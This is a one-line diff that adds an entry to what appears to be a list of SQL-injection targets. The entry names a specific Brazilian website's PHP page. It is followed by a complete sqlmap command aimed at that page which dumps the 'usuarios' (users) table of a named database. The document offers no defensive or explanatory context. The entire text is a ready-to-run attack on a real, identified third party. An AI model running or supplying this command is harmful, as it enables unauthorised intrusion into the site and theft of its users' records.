@@ -1,0 +1,1 @@
+http://www.escritoriomalkowski.com.br/links-uteis.php?c=6 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.escritoriomalkowski.com.br/links-uteis.php?c=6 -D escmalkodb -T usuarios --dump
